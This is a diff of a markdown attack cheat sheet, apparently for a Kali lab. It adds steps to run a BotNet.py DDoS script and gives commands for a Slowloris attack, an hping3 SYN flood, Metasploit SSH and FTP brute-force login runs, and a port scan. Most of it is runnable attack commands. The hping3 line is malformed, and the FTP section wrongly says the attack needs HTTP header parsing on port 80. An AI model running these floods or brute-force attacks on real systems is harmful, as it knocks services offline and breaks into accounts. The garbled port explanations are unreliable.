@@ -2,6 +2,29 @@
 
 ## DDoS & DoS Attacks and Bot Attacks
 
+# BOTNET ATTACK Type DDoS
+
+**Setup:**
+1. Create a file in your VM Kali linux a python file
+2. In BotNet.py in this project copy the file values
+3. Paste it to the file you created in Kali Linux
+4. Run it
+
+**NOTE**
+Make Sure that the configurations like IP ADDRESS is changed in the BOTNET Attack file
+
+```shell
+cd <PATH-FOLDER>
+sudo python3 <FILE-NAME>
+```
+
+using Same Machine:
+
+```shell
+cd Test
+py BotNet.py
+```
+
 # 1. Slowloris
 
 Using Metasploit
@@ -38,7 +61,8 @@ msf6 auxiliary(dos/http/slowloris) > run
 
 Using hping ( custom packet/attack gegenrator)
 
-- `sudo hping3 -S -p 80 -i u100000 <TARGET-IP>`
+- `hping3 -S -p 80 --flood 192.168.1.2 <TARGET-IP>` 
+
 
 # 2. Syn Flood
 ```shell
@@ -89,7 +113,7 @@ msfconsole
 use auxiliary/scanner/ssh/ssh_login
 set USER_FILE /home/jonel/Desktop/bruteforcefiles/usernames.txt
 set USERPASS_FILE /home/jonel/Desktop/bruteforcefiles/passwords.txt
-set RHOSTS 192.168.1.2
+set RHOSTS <VICTIM-IP>
 run
 ```
 
@@ -107,7 +131,7 @@ msfconsole
 use auxiliary/scanner/ftp/ftp_login
 set USER_FILE /home/jonel/Desktop/bruteforcefiles/usernames.txt
 set USERPASS_FILE /home/jonel/Desktop/bruteforcefiles/passwords.txt
-set RHOSTS 192.168.1.2
+set RHOSTS <VICTIM-IP>
 run
 ```
 
@@ -124,3 +148,19 @@ run
     msf6 auxiliary(scanner/portscan/tcp) > run
 ``` 
 
+# Why PORTS are fixed and shouldnt be change if necessary?
+
+## FTP Brute Force
+* The FTP protocol, as defined by the IANA (Internet Assigned Numbers Authority), uses port 21 by default for control commands. This is universally accepted and implemented in most systems.
+* Attack requires HTTP header parsing, which happens on port 80
+
+## SSH Brute Force
+* SSH (Secure Shell) uses port 22 by IANA and is rarely changed.
+* Changing SSH port is a rare hardening technique and not common in most systems.
+
+## Syn Flood
+* SYN flood are threshold-based per port.
+* Port 80 is common for simplified simulation as it allows visible test setups using basic HTTP services.
+
+## Slowloris
+* Attack requires HTTP header parsing, which happens on port 80
